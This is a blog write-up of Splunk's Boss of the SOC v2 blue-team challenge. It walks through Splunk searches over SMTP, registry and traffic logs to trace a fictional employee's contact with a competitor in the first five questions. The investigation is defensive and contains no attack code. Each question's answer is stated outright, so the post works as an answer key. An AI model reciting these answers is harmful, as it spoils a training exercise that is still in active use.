---
title: Boss of the SOC version 2 Write-ups
date: 2025-1-18 16:00:00 + 0700
categories: [siem, blue-teaming, soc, ctf-challenge]
tags: [splunk, threat-hunting, log-analysis, write-ups]  
author: <author_id>   
description: Become Alice Bluebird - a cybersecurity analyst to help Frothly - A beer company investigate anomalous activities within their operations 
# toc: false - uncomment to turn off Table of Contents which is use for display content in right-panel 
#comments: false # uncomment to turn on comment 
image: /assets/images/preview/botsv2.png
---
# Introduction  
Hi Splunkers! Welcome back to my **Boss of the SOC (BOTS)** series on my blog.

If you have not read my [BOTSv1 Write-ups](https://phamthanhsang-cs.github.io/posts/BOTSV1/) yet, please take a look to have a understand about [Boss of the SOC - Blue team CTF Challenge made by Splunk](https://www.splunk.com/en_us/blog/security/what-you-need-to-know-about-boss-of-the-soc.html), i appreciate that a lot !

### About Boss of the SOC version 2
In [BOTSv1 Write-ups](https://phamthanhsang-cs.github.io/posts/BOTSV1/), we stepped into the shoes of Alice Bluebird - a quirky cybersecurity analyst to help Wayne Enterprises uncover the root causes of their digital chaos. From website defacements to ransomware attacks on employee machines, we tackled it all!

Now, in Boss of the SOC Version 2, Alice Bluebird returns, this time to assist Frothly - a beer company, in detecting and identifying their security incidents.

This version introduces new challenges, featuring advanced technologies, platforms, and tools. We’ll uncover a sophisticated APT group orchestrating multi-stage attacks, dive into fraud investigations, and even tackle insider threats.

Stay tuned for an exciting journey into the next level of cyber defense!

# Enviroment setup
- **Pre-requisites:** Participating in Boss of the SOC (BOTS) is easier than ever, thanks to it's availability on various platforms:
  - [Splunk Officially](https://bots.splunk.com/login?redirect=/)
  - [TryHackMe](https://tryhackme.com/)
  - [CyberDefenders](https://cyberdefenders.org/)

*However, all the walkthroughs in this guide are based on **self-hosted setup**, including more or less what's CTF scoreboard look like. If you'd like to follow along or set up your own CTF environment, check out this [detailed post](https://phamthanhsang-cs.github.io/posts/BOTS-setup/) where we’ll walk through everything step-by-step together, thank you.*

- **Dataset Information:** For this walkthrough, I’m using the full dataset from BOTSv2, which is five times larger than BOTSv1 - approximately 16.4 GB and around **226 million events**! That’s an incredible amount of data, and we’re in for a thrilling deep dive to explore and analyze these logs together.
  
# Walkthrough 
### Let's Splunking !
Same as BOTsv1. before deep diving into answer BOTS questions, i would like to prepare some SPL searches to help us easier to hunting threats: 
- First is `|metadata index="botsv1" type=sourcetypes | stats values(sourcetype)`, the following SPL command helps me quickly identify the sourcetypes present in the dataset. This gives me a clear idea of the types of data we should focus on during investigation:
- The second one is `|metasearch index="botsv1" sourcetype=<specific_sourcetype> <keyword>`.
- The third one is `|fieldsummary` with [marcro](https://docs.splunk.com/Splexicon:Searchmacro) setup. My search will look like this:

```sql
| fieldsummary 
| fields field values value 
| rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
| fields field value
```
*And i'd set this search with marcro named `spog` (single pane of glass), you will see why those searches helped me so much in this walkthrough.*

![pic1](/assets/images/botsv2/pic1.png)
_WELCOME BACK TO MY BOSS OF THE SOC SERIES_

**Boss of the SOC Version 2** is a massive upgrade compared to Version 1, featuring **50 questions**, over **200** million events, and numerous add-on apps. So... let the battle begin!

### Series 100

#### Question 1 (100): Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited? Answer guidance: Do not provide the FQDN. Answer example: google.com

Before diving into hunting, I recommend starting with a bird's-eye view of the data. Using `|metadata`, we can quickly get an idea of which sourcetype to focus on.

![pic2](/assets/images/botsv2/pic2.png)
_Wow, 102 sourcetypes, insane number!_

Given the sheer number of sourcetypes to analyze, I used `|metasearch` to narrow the scope for hunting by using this SPL search:
```sql
|metasearch index=botsv2 sourcetype=* amber
```
This search returned approximately 700,000 events and provided the following insights:
- host(8)
- source(47)
- sourcetype(14)

List of sourcetypes included:

| sourcetype                | count  |
| ------------------------- | ------ |
| pan:traffic               | 588769 |
| xmlwineventlog            | 21358  |
| WinRegistry               | 18743  |
| symantec:ep:traffic:file  | 11699  |
| wineventlog               | 7522   |
| stream:smb                | 6756   |
| symantec:ep:agent:file    | 1560   |
| WinHostMon                | 477    |
| stream:smtp               | 430    |
| ps                        | 154    |
| stream:dns                | 10     |
| osquery_results           | 4      |
| symantec:ep:scan:file     | 1      |
| symantec:ep:security:file | 1      |

Because this question seems so broad to me, it took my time to think how can i approach with the question. Also, since we have a tons of event data which is made our journey much more challenges, we don't really want to dive into the large pool, right ? 

With such a broad question and a large dataset, it's critical to avoid jumping into the "deep end" without a strategy. My approach began by examining sourcetypes like `symantec:*`, `osquery_results`, `stream:dns`, and `ps`, but none yielded actionable insights.

Until, i found something in `stream:smtp`. For anyone who don't know what's smtp yet, SMTP stands for [Simple Mail Transfer Protocol](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol) which commonly use for send and receive mail messages.

`subject` is the most interested field for me because it gives you an overall idea of mail content. Twerking my SPL searche, and got this results.
```sql
index=botsv2 sourcetype=stream:smtp amber 
| spath subject 
| table subject 
|dedup subject
```
![pic3](/assets/images/botsv2/pic3.png)
_Two subjects seem highly relevant to the question_

To confirm their relevance, I investigated further with this SPL search:

```sql
index=botsv2 sourcetype=stream:smtp amber 
| spath subject 
| search subject="Heinz Bernhard Contact Information" OR subject="RE: Heinz Bernhard Contact Information"
```

```json
{
  "endtime": "2017-08-29T11:08:20.962615Z",
  "timestamp": "2017-08-29T11:08:20.926750Z",
  "ack_packets_in": 1,
  "ack_packets_out": 1,
  "bytes": 11577,
  "bytes_in": 11540,
  "bytes_out": 37,
  "capture_hostname": "matar",
  "client_rtt": 0,
  "client_rtt_packets": 0,
  "client_rtt_sum": 0,
  "content": [

  ],
  "content_body": [

  ],
  "content_transfer_encoding": [
    "quoted-printable",
    "quoted-printable"
  ],
  "content_type": " multipart/alternative;\r\n boundary=\"=_5527708fbc91bd8e7afe104d6c2147f8\"",
  "data_packets_in": 2,
  "data_packets_out": 1,
  "date": "Tue, 29 Aug 2017 04:08:14 -0700",
  "dest_ip": "172.31.38.181",
  "dest_mac": "06:6A:51:FA:0A:B0",
  "dest_port": 25,
  "duplicate_packets_in": 0,
  "duplicate_packets_out": 0,
  "flow_id": "39f7b3b5-aa7c-4e93-9574-d7611ecf489b",
  "mime_type": "multipart/alternative",
  "mime_version": " 1.0",
  "missing_packets_in": 0,
  "missing_packets_out": 0,
  "msg_id": "<5814aa43f21b630e9f3566c1c6d86ce24485b00c@webmail.berkbeer.com>",
  "network_interface": "eth0",
  "packets_in": 3,
  "packets_out": 2,
  "protocol_stack": "ip:tcp:smtp",
  "received_by_name": [
    "SN2PR18CA0006.outlook.office365.com",
    "homiemail-a66.g.dreamhost.com",
    "homiemail-a66.g.dreamhost.com"
  ],
  "received_date": [
    "Tue, 29 Aug 2017 11:08:17 +0000",
    "Tue, 29 Aug 2017 11:08:16 +0000",
    "Tue, 29 Aug 2017 11:08:16 +0000",
    "Tue, 29 Aug 2017 04:08:15 -0700 (PDT)",
    "Tue, 29 Aug 2017 04:08:15 -0700 (PDT)"
  ],
  "received_from_ip": [
    "127.0.0.1",
    "66.33.206.8"
  ],
  "received_from_name": [
    "BN3NAM01FT040.eop-nam01.prod.protection.outlook.com",
    "homiemail-a66.g.dreamhost.com",
    "localhost"
  ],
  "received_server_agent": [
    "2603:10b6:804:1b::16",
    "Postfix",
    "Postfix"
  ],
  "received_with": [
    "Microsoft",
    "ESMTP",
    "ESMTPSA"
  ],
  "receiver": [
    "aturing@froth.ly"
  ],
  "receiver_email": [
    "aturing@froth.ly"
  ],
  "receiver_type": [
    "TO"
  ],
  "reply_time": 3149,
  "request_ack_time": 16,
  "request_time": 32716,
  "response_ack_time": 42836,
  "response_code": 250,
  "response_time": 0,
  "sender": "hbernhard@berkbeer.com",
  "sender_email": "hbernhard@berkbeer.com",
  "server_response": "250 2.0.0 Ok: queued as BA452177593",
  "server_rtt": 15,
  "server_rtt_packets": 2,
  "server_rtt_sum": 31,
  "src_ip": "104.47.37.78",
  "src_mac": "06:E3:CC:18:AA:33",
  "src_port": 40304,
  "subject": "Heinz Bernhard Contact Information",
  "time_taken": 35865,
  "transport": "tcp",
  "xmailer": "Atmail 7.8.0.2"
}
```
`sender:hbernhard@berkbeer.com` seems like the key finding for me. To confirm if this was the website Amber interacted with, i used:
```sql
|metasearch index=botsv2 sourcetype=* berkbeer.com | fieldsummary
```
![pic4](/assets/images/botsv2/pic4.png)
_wala, Amber Turing actually did something with berkbeer.com_

```sql
index=botsv2 sourcetype=* berkbeer.com host=wrk-aturing
```

The last event confirmed that Amber actually visited berkbeer.com at 08/29/2017 03:39:59.983
```text
08/29/2017 03:39:59.983
event_status="(0)The operation completed successfully."
pid=4576
process_image="c:\Program Files (x86)\Internet Explorer\iexplore.exe"
registry_type="SetValue"
key_path="HKU\s-1-5-21-3348076501-352378380-2991248034-1118\software\microsoft\internet explorer\typedurls\url1"
data_type="REG_SZ"
data="http://www.berkbeer.com/"
```

> ANSWER: berkbeer.com
{: .prompt-info }

#### Question 2 (101): Amber found the executive contact information and sent him an email. What is the CEO's name? Provide the first and last name.
We were able to simplify the investigation significantly after identifying the website Amber visited (`berkbeer.com`).

We also knew which kind of data from `stream:smtp` give us.

From the SMTP data (`stream:smtp`), we inferred Amber’s workflow:
- **Visited**: berkbeer.com.
- **Obtained**: Executive contact information.
- **Sent**: An email to the executive.

To trace Amber’s email activity, we used the following SPL search in Splunk:
```sql
index=botsv2 sourcetype=stream:smtp berkbeer.com AND amber 
| reverse   // Reverse the results to identify the first email Amber sent to the berkbeer.com domain
```
![pic5](/assets/images/botsv2/pic5.png)
_Only 4 events back, helped us analyze those event in details_

Key finding #1: Amber sent an email to Mr. Bernhard expressing concern about her job and sharing her willingness to provide information.

```text
content_body: [ [-]
     --_000_SN1PR18MB058947DF30988EF32297D445D4890SN1PR18MB0589namp_

     Mr. Bernhard,
   I was very sorry to hear about the acquisition falling through. I was ve=
ry excited to work with you in the future. I have to admit, I am a little w=
orried about my future here. I'd love to talk to you about some information=
 I have regarding my work.

Amber Turing
Principal Scientist
867.322.1123
Froth.ly
```


Key finding #2: The CEO of Berk Beer, replied with a request to schedule a call, also involving Mr. Bernhard:
```html
   <html>
     <body style=3D"font-family: Helvetica, Arial, sans-serif; font-size:=12px; ">Hello Amber,=C2=A0 <div>
         <br>
       </div>
       <div>Great to hear from you, ye= s it is unfortunate the way things turned out. It would be great to spea= k with you directly, I would also like to have Bernhard on the call as I= think he might have some questions for you. =C2=A0Give me a call this a= fternoon if you are free.=C2=A0</div>
       <div>
         <br>
       </div>
       <div>Martin Berk </di= v>
         <div>CEO</div>
         <div>777.222.8765</div>
         <div>mberk@berkbeer.com <br>
           <br>
           <b= lockquote class=3D"atmailquote">
             <br>----- Original Message ----- <br>
             <div= id=3D"origionalMessageFromField" style=3D"width:100%;display:inline;bac=kground:rgb(228,228,228);">
               <div style=3D"display:inline;font-weight:bold=;">From:</div> "Amber Turing" &lt;aturing@froth.ly&gt;
         </div>
         <br>
         <div id==3D"origionalMessageToField" style=3D"display:inline;font-weight:bold;">= To:</div>"mberk@berkbeer.com" &lt;mberk@berkbeer.com&gt; <br>
         <div id=3D"o=rigionalMessageSentField" style=3D"display:inline;font-weight:bold;">Cc:= </div>
         <br>
         <div style=3D"display:inline;font-weight:bold;">Sent:</div>Fri= , 11 Aug 2017 15:49:01 +0000 <br>
         <div id=3D"origionalMessageSubjectField"=style=3D"display:inline;font-weight:bold;">Subject:</div>Amber from Fro= th.ly <br>
         <br>
         <br>
         <div class=3D"WordSection1">=0A <p class=3D"MsoNormal">M= r. Bernhard,</p>
           <p></p>=0A <p class=3D"MsoNormal">=C2=A0=C2=A0 I was very= sorry to hear about the acquisition falling through. I was very excited= to work with you in the future. I have to admit, I am a little worried= about my future here. I=E2=80=99d love to talk to you about some inform= ation I have regarding=0A my work. <br>
             <br>=0AAmber Turing <br>=0APrincipa= l Scientist <br>=0A867.322.1123 <br>=0AFroth.ly
           </p>
           <p></p>=0A
         </div>=0A=0A= =09 </blockquote>
       </div>
     </body>
   </html>
```
To simplify reading the HTML email content, I used an HTML Viewer tool, which made the structured content more accessible.

![pic6](/assets/images/botsv2/pic6.png)
_We got it, right ?!_

> ANSWER: Martin Berk
{: .prompt-info }

#### Question 3 (102): After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee's email address?
We already knew the CEO’s email address: `mberk@berkbeer.com`. From **Question 1(100)**, we referred to another email associated with the communication.

This email belongs to **Heinz Bernhard**.

> ANSWER: hbernhard@berkbeer.com
{: .prompt-info }

#### Question 4 (103): What is the name of the file attachment that Amber sent to a contact at the competitor?
By examining the interesting fields, we noticed several fields related to attachments:

```text
Interesting Fields
# ack_packets_in 2
# ack_packets_out 4
a attach_disposition{} 1
a attach_filename{} 1
# attach_size_decoded{} 1
# attach_size{} 1
a attach_transfer_encoding{} 1
a attach_type{} 1
```
Among these, `attach_filename` stood out as the most interested field.


![pic7](/assets/images/botsv2/pic7.png)
_This raises an important question: Is Amber an insider threat?_

> ANSWER: Saccharomyces_cerevisiae_patent.docx
{: .prompt-info }

#### Question 5 (104): What is Amber's personal email address?
After Heinz Bernhard was introduced to Amber by the CEO, Heinz sent a follow-up email. Below is the content of his email, which reflects his intent to establish further communication.

Key finding #1:
```text
     --=_5527708fbc91bd8e7afe104d6c2147f8

     Hello Amber,=C2=A0=0A=0AGreat talking with you today, here is my contact=
 information. Do you=0Ahave a personal email I can reach you at as well?=
=C2=A0=0A=0AThank You=0A=0AHeinz Bernhard=0Ahernhard@berkbeer.com=0A865.=
888.7563=C2=A0=0A=0A

     <html><body style=3D"font-family: Helvetica,Arial,sans-serif; font-size:=
 12px;">Hello Amber,=C2=A0<div><br></div><div>Great talking with you tod=
ay, here is my contact information. Do you have a personal email I can r=
each you at as well?=C2=A0</div><div><br></div><div>Thank You</div><div>=
<br></div><div>Heinz Bernhard</div><div>hernhard@berkbeer.com</div><div>=
865.888.7563=C2=A0</div><div><br></div></body></html>
```
- Heinz expresses interest in continuing their discussion and requests Amber’s personal email address.
- This suggests Heinz might be seeking to establish communication outside of the corporate environment.

Key finding #2:
<details>
  <summary>Base 64 Content</Summary>
   --_004_SN1PR18MB058979205875E88B06061480D4960SN1PR18MB0589namp_

     --_000_SN1PR18MB058979205875E88B06061480D4960SN1PR18MB0589namp_

     VGhhbmtzIGZvciB0YWtpbmcgdGhlIHRpbWUgdG9kYXksIEFzIGRpc2N1c3NlZCBoZXJlIGlzIHRo
ZSBkb2N1bWVudCBJIHdhcyByZWZlcnJpbmcgdG8uICBQcm9iYWJseSBiZXR0ZXIgdG8gdGFrZSB0
aGlzIG9mZmxpbmUuIEVtYWlsIG1lIGZyb20gbm93IG9uIGF0IGFtYmVyc3RoZWJlc3RAeWVhc3Rp
ZWJlYXN0aWUuY29tPG1haWx0bzphbWJlcnN0aGViZXN0QHllYXN0aWViZWFzdGllLmNvbT4NCg0K
RnJvbTogaGJlcm5oYXJkQGJlcmtiZWVyLmNvbTxtYWlsdG86aGJlcm5oYXJkQGJlcmtiZWVyLmNv
bT4gW21haWx0bzpoYmVybmhhcmRAYmVya2JlZXIuY29tXQ0KU2VudDogRnJpZGF5LCBBdWd1c3Qg
MTEsIDIwMTcgOTowOCBBTQ0KVG86IEFtYmVyIFR1cmluZyA8YXR1cmluZ0Bmcm90aC5seTxtYWls
dG86YXR1cmluZ0Bmcm90aC5seT4+DQpTdWJqZWN0OiBIZWlueiBCZXJuaGFyZCBDb250YWN0IElu
Zm9ybWF0aW9uDQoNCkhlbGxvIEFtYmVyLA0KDQpHcmVhdCB0YWxraW5nIHdpdGggeW91IHRvZGF5
LCBoZXJlIGlzIG15IGNvbnRhY3QgaW5mb3JtYXRpb24uIERvIHlvdSBoYXZlIGEgcGVyc29uYWwg
ZW1haWwgSSBjYW4gcmVhY2ggeW91IGF0IGFzIHdlbGw/DQoNClRoYW5rIFlvdQ0KDQpIZWlueiBC
ZXJuaGFyZA0KaGVybmhhcmRAYmVya2JlZXIuY29tPG1haWx0bzpoZXJuaGFyZEBiZXJrYmVlci5j
b20+DQo4NjUuODg4Ljc1NjMNCg0K

     PGh0bWwgeG1sbnM6dj0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTp2bWwiIHhtbG5zOm89InVy
bjpzY2hlbWFzLW1pY3Jvc29mdC1jb206b2ZmaWNlOm9mZmljZSIgeG1sbnM6dz0idXJuOnNjaGVt
YXMtbWljcm9zb2Z0LWNvbTpvZmZpY2U6d29yZCIgeG1sbnM6bT0iaHR0cDovL3NjaGVtYXMubWlj
cm9zb2Z0LmNvbS9vZmZpY2UvMjAwNC8xMi9vbW1sIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv
VFIvUkVDLWh0bWw0MCI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIg
Y29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ij4NCjxtZXRhIG5hbWU9IkdlbmVyYXRv
ciIgY29udGVudD0iTWljcm9zb2Z0IFdvcmQgMTUgKGZpbHRlcmVkIG1lZGl1bSkiPg0KPHN0eWxl
PjwhLS0NCi8qIEZvbnQgRGVmaW5pdGlvbnMgKi8NCkBmb250LWZhY2UNCgl7Zm9udC1mYW1pbHk6
SGVsdmV0aWNhOw0KCXBhbm9zZS0xOjIgMTEgNSA0IDIgMiAyIDIgMiA0O30NCkBmb250LWZhY2UN
Cgl7Zm9udC1mYW1pbHk6IkNhbWJyaWEgTWF0aCI7DQoJcGFub3NlLTE6MCAwIDAgMCAwIDAgMCAw
IDAgMDt9DQpAZm9udC1mYWNlDQoJe2ZvbnQtZmFtaWx5OkNhbGlicmk7DQoJcGFub3NlLTE6MiAx
NSA1IDIgMiAyIDQgMyAyIDQ7fQ0KLyogU3R5bGUgRGVmaW5pdGlvbnMgKi8NCnAuTXNvTm9ybWFs
LCBsaS5Nc29Ob3JtYWwsIGRpdi5Nc29Ob3JtYWwNCgl7bWFyZ2luOjBpbjsNCgltYXJnaW4tYm90
dG9tOi4wMDAxcHQ7DQoJZm9udC1zaXplOjExLjBwdDsNCglmb250LWZhbWlseToiQ2FsaWJyaSIs
c2Fucy1zZXJpZjt9DQphOmxpbmssIHNwYW4uTXNvSHlwZXJsaW5rDQoJe21zby1zdHlsZS1wcmlv
cml0eTo5OTsNCgljb2xvcjojMDU2M0MxOw0KCXRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7fQ0K
YTp2aXNpdGVkLCBzcGFuLk1zb0h5cGVybGlua0ZvbGxvd2VkDQoJe21zby1zdHlsZS1wcmlvcml0
eTo5OTsNCgljb2xvcjojOTU0RjcyOw0KCXRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7fQ0KcC5t
c29ub3JtYWwwLCBsaS5tc29ub3JtYWwwLCBkaXYubXNvbm9ybWFsMA0KCXttc28tc3R5bGUtbmFt
ZTptc29ub3JtYWw7DQoJbXNvLW1hcmdpbi10b3AtYWx0OmF1dG87DQoJbWFyZ2luLXJpZ2h0OjBp
bjsNCgltc28tbWFyZ2luLWJvdHRvbS1hbHQ6YXV0bzsNCgltYXJnaW4tbGVmdDowaW47DQoJZm9u
dC1zaXplOjExLjBwdDsNCglmb250LWZhbWlseToiQ2FsaWJyaSIsc2Fucy1zZXJpZjt9DQpzcGFu
LkVtYWlsU3R5bGUxOA0KCXttc28tc3R5bGUtdHlwZTpwZXJzb25hbDsNCglmb250LWZhbWlseToi
Q2FsaWJyaSIsc2Fucy1zZXJpZjsNCgljb2xvcjp3aW5kb3d0ZXh0O30NCnNwYW4uRW1haWxTdHls
ZTIwDQoJe21zby1zdHlsZS10eXBlOnBlcnNvbmFsLXJlcGx5Ow0KCWZvbnQtZmFtaWx5OiJDYWxp
YnJpIixzYW5zLXNlcmlmOw0KCWNvbG9yOndpbmRvd3RleHQ7fQ0KLk1zb0NocERlZmF1bHQNCgl7

     bXNvLXN0eWxlLXR5cGU6ZXhwb3J0LW9ubHk7DQoJZm9udC1zaXplOjEwLjBwdDt9DQpAcGFnZSBX
b3JkU2VjdGlvbjENCgl7c2l6ZTo4LjVpbiAxMS4waW47DQoJbWFyZ2luOjEuMGluIDEuMGluIDEu
MGluIDEuMGluO30NCmRpdi5Xb3JkU2VjdGlvbjENCgl7cGFnZTpXb3JkU2VjdGlvbjE7fQ0KLS0+
PC9zdHlsZT48IS0tW2lmIGd0ZSBtc28gOV0+PHhtbD4NCjxvOnNoYXBlZGVmYXVsdHMgdjpleHQ9
ImVkaXQiIHNwaWRtYXg9IjEwMjYiIC8+DQo8L3htbD48IVtlbmRpZl0tLT48IS0tW2lmIGd0ZSBt
c28gOV0+PHhtbD4NCjxvOnNoYXBlbGF5b3V0IHY6ZXh0PSJlZGl0Ij4NCjxvOmlkbWFwIHY6ZXh0
PSJlZGl0IiBkYXRhPSIxIiAvPg0KPC9vOnNoYXBlbGF5b3V0PjwveG1sPjwhW2VuZGlmXS0tPg0K
PC9oZWFkPg0KPGJvZHkgbGFuZz0iRU4tVVMiIGxpbms9IiMwNTYzQzEiIHZsaW5rPSIjOTU0Rjcy
Ij4NCjxkaXYgY2xhc3M9IldvcmRTZWN0aW9uMSI+DQo8cCBjbGFzcz0iTXNvTm9ybWFsIj5UaGFu
a3MgZm9yIHRha2luZyB0aGUgdGltZSB0b2RheSwgQXMgZGlzY3Vzc2VkIGhlcmUgaXMgdGhlIGRv
Y3VtZW50IEkgd2FzIHJlZmVycmluZyB0by4mbmJzcDsgUHJvYmFibHkgYmV0dGVyIHRvIHRha2Ug
dGhpcyBvZmZsaW5lLiBFbWFpbCBtZSBmcm9tIG5vdyBvbiBhdA0KPGEgaHJlZj0ibWFpbHRvOmFt
YmVyc3RoZWJlc3RAeWVhc3RpZWJlYXN0aWUuY29tIj5hbWJlcnN0aGViZXN0QHllYXN0aWViZWFz
dGllLmNvbTwvYT4NCjxvOnA+PC9vOnA+PC9wPg0KPHAgY2xhc3M9Ik1zb05vcm1hbCI+PG86cD4m
bmJzcDs8L286cD48L3A+DQo8ZGl2Pg0KPGRpdiBzdHlsZT0iYm9yZGVyOm5vbmU7Ym9yZGVyLXRv
cDpzb2xpZCAjRTFFMUUxIDEuMHB0O3BhZGRpbmc6My4wcHQgMGluIDBpbiAwaW4iPg0KPHAgY2xh
c3M9Ik1zb05vcm1hbCI+PGI+RnJvbTo8L2I+IDxhIGhyZWY9Im1haWx0bzpoYmVybmhhcmRAYmVy
a2JlZXIuY29tIj5oYmVybmhhcmRAYmVya2JlZXIuY29tPC9hPiBbPGEgaHJlZj0ibWFpbHRvOmhi

     ZXJuaGFyZEBiZXJrYmVlci5jb20iPm1haWx0bzpoYmVybmhhcmRAYmVya2JlZXIuY29tPC9hPl0N
Cjxicj4NCjxiPlNlbnQ6PC9iPiBGcmlkYXksIEF1Z3VzdCAxMSwgMjAxNyA5OjA4IEFNPGJyPg0K
PGI+VG86PC9iPiBBbWJlciBUdXJpbmcgJmx0OzxhIGhyZWY9Im1haWx0bzphdHVyaW5nQGZyb3Ro
Lmx5Ij5hdHVyaW5nQGZyb3RoLmx5PC9hPiZndDs8YnI+DQo8Yj5TdWJqZWN0OjwvYj4gSGVpbnog
QmVybmhhcmQgQ29udGFjdCBJbmZvcm1hdGlvbjxvOnA+PC9vOnA+PC9wPg0KPC9kaXY+DQo8L2Rp
dj4NCjxwIGNsYXNzPSJNc29Ob3JtYWwiPjxvOnA+Jm5ic3A7PC9vOnA+PC9wPg0KPHAgY2xhc3M9
Ik1zb05vcm1hbCI+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTo5LjBwdDtmb250LWZhbWlseTomcXVv
dDtIZWx2ZXRpY2EmcXVvdDssc2Fucy1zZXJpZiI+SGVsbG8gQW1iZXIsJm5ic3A7PG86cD48L286
cD48L3NwYW4+PC9wPg0KPGRpdj4NCjxwIGNsYXNzPSJNc29Ob3JtYWwiPjxzcGFuIHN0eWxlPSJm
b250LXNpemU6OS4wcHQ7Zm9udC1mYW1pbHk6JnF1b3Q7SGVsdmV0aWNhJnF1b3Q7LHNhbnMtc2Vy
aWYiPjxvOnA+Jm5ic3A7PC9vOnA+PC9zcGFuPjwvcD4NCjwvZGl2Pg0KPGRpdj4NCjxwIGNsYXNz
PSJNc29Ob3JtYWwiPjxzcGFuIHN0eWxlPSJmb250LXNpemU6OS4wcHQ7Zm9udC1mYW1pbHk6JnF1
b3Q7SGVsdmV0aWNhJnF1b3Q7LHNhbnMtc2VyaWYiPkdyZWF0IHRhbGtpbmcgd2l0aCB5b3UgdG9k
YXksIGhlcmUgaXMgbXkgY29udGFjdCBpbmZvcm1hdGlvbi4gRG8geW91IGhhdmUgYSBwZXJzb25h
bCBlbWFpbCBJIGNhbiByZWFjaCB5b3UgYXQgYXMgd2VsbD8mbmJzcDs8bzpwPjwvbzpwPjwvc3Bh
bj48L3A+DQo8L2Rpdj4NCjxkaXY+DQo8cCBjbGFzcz0iTXNvTm9ybWFsIj48c3BhbiBzdHlsZT0i
Zm9udC1zaXplOjkuMHB0O2ZvbnQtZmFtaWx5OiZxdW90O0hlbHZldGljYSZxdW90OyxzYW5zLXNl
cmlmIj48bzpwPiZuYnNwOzwvbzpwPjwvc3Bhbj48L3A+DQo8L2Rpdj4NCjxkaXY+DQo8cCBjbGFz
cz0iTXNvTm9ybWFsIj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjkuMHB0O2ZvbnQtZmFtaWx5OiZx
dW90O0hlbHZldGljYSZxdW90OyxzYW5zLXNlcmlmIj5UaGFuayBZb3U8bzpwPjwvbzpwPjwvc3Bh
bj48L3A+DQo8L2Rpdj4NCjxkaXY+DQo8cCBjbGFzcz0iTXNvTm9ybWFsIj48c3BhbiBzdHlsZT0i
Zm9udC1zaXplOjkuMHB0O2ZvbnQtZmFtaWx5OiZxdW90O0hlbHZldGljYSZxdW90OyxzYW5zLXNl
cmlmIj48bzpwPiZuYnNwOzwvbzpwPjwvc3Bhbj48L3A+DQo8L2Rpdj4NCjxkaXY+DQo8cCBjbGFz
cz0iTXNvTm9ybWFsIj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjkuMHB0O2ZvbnQtZmFtaWx5OiZx
dW90O0hlbHZldGljYSZxdW90OyxzYW5zLXNlcmlmIj5IZWlueiBCZXJuaGFyZDxvOnA+PC9vOnA+
PC9zcGFuPjwvcD4NCjwvZGl2Pg0KPGRpdj4NCjxwIGNsYXNzPSJNc29Ob3JtYWwiPjxzcGFuIHN0
eWxlPSJmb250LXNpemU6OS4wcHQ7Zm9udC1mYW1pbHk6JnF1b3Q7SGVsdmV0aWNhJnF1b3Q7LHNh
bnMtc2VyaWYiPjxhIGhyZWY9Im1haWx0bzpoZXJuaGFyZEBiZXJrYmVlci5jb20iPmhlcm5oYXJk
QGJlcmtiZWVyLmNvbTwvYT48bzpwPjwvbzpwPjwvc3Bhbj48L3A+DQo8L2Rpdj4NCjxkaXY+DQo8
cCBjbGFzcz0iTXNvTm9ybWFsIj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjkuMHB0O2ZvbnQtZmFt
aWx5OiZxdW90O0hlbHZldGljYSZxdW90OyxzYW5zLXNlcmlmIj44NjUuODg4Ljc1NjMmbmJzcDs8
bzpwPjwvbzpwPjwvc3Bhbj48L3A+DQo8L2Rpdj4NCjxkaXY+DQo8cCBjbGFzcz0iTXNvTm9ybWFs
Ij48c3BhbiBzdHlsZT0iZm9udC1zaXplOjkuMHB0O2ZvbnQtZmFtaWx5OiZxdW90O0hlbHZldGlj
YSZxdW90OyxzYW5zLXNlcmlmIj48bzpwPiZuYnNwOzwvbzpwPjwvc3Bhbj48L3A+DQo8L2Rpdj4N
CjwvZGl2Pg0KPC9ib2R5Pg0KPC9odG1sPg0K

     
--_004_SN1PR18MB058979205875E88B06061480D4960SN1PR18MB0589namp_
</details>

Using [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=LS1fMDA0X1NOMVBSMThNQjA1ODk3OTIwNTg3NUU4OEIwNjA2MTQ4MEQ0OTYwU04xUFIxOE1CMDU4OW5hbXBfIC0tXzAwMF9TTjFQUjE4TUIwNTg5NzkyMDU4NzVFODhCMDYwNjE0ODBENDk2MFNOMVBSMThNQjA1ODluYW1wXyBWR2hoYm10eklHWnZjaUIwWVd0cGJtY2dkR2hsSUhScGJXVWdkRzlrWVhrc0lFRnpJR1JwYzJOMWMzTmxaQ0JvWlhKbElHbHpJSFJvIFpTQmtiMk4xYldWdWRDQkpJSGRoY3lCeVpXWmxjbkpwYm1jZ2RHOHVJQ0JRY205aVlXSnNlU0JpWlhSMFpYSWdkRzhnZEdGclpTQjAgYUdseklHOW1abXhwYm1VdUlFVnRZV2xzSUcxbElHWnliMjBnYm05M0lHOXVJR0YwSUdGdFltVnljM1JvWldKbGMzUkFlV1ZoYzNScCBaV0psWVhOMGFXVXVZMjl0UEcxaGFXeDBienBoYldKbGNuTjBhR1ZpWlhOMFFIbGxZWE4wYVdWaVpXRnpkR2xsTG1OdmJUNE5DZzBLIFJuSnZiVG9nYUdKbGNtNW9ZWEprUUdKbGNtdGlaV1Z5TG1OdmJUeHRZV2xzZEc4NmFHSmxjbTVvWVhKa1FHSmxjbXRpWldWeUxtTnYgYlQ0Z1cyMWhhV3gwYnpwb1ltVnlibWhoY21SQVltVnlhMkpsWlhJdVkyOXRYUTBLVTJWdWREb2dSbkpwWkdGNUxDQkJkV2QxYzNRZyBNVEVzSURJd01UY2dPVG93T0NCQlRRMEtWRzg2SUVGdFltVnlJRlIxY21sdVp5QThZWFIxY21sdVowQm1jbTkwYUM1c2VUeHRZV2xzIGRHODZZWFIxY